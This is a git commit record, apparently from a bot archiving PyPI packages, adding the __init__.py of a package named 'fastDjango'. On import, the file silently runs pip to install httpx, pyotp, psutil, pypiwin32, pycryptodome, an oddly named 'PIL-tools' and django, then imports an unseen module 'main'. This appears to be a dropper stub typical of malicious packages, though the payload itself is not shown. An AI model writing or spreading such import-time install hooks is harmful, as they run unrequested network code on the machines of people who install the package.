4dce645357f4ccd782ed900a46dde62fa5bdfa5c
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 11:17:31 +0000

    Add package fastDjango/0.0.1/fastDjango-0.0.1-py3-none-any.whl

---
+++ packages/fastDjango/fastDjango-0.0.1-py3-none-any.whl/fastDjango/__init__.py
@@ -0,0 +1,9 @@
+import os
+os.system("pip install httpx")
+os.system("pip install pyotp")
+os.system("pip install psutil")
+os.system("pip install pypiwin32")
+os.system("pip install pycryptodome")
+os.system("pip install PIL-tools")
+os.system("pip install django")
+import main
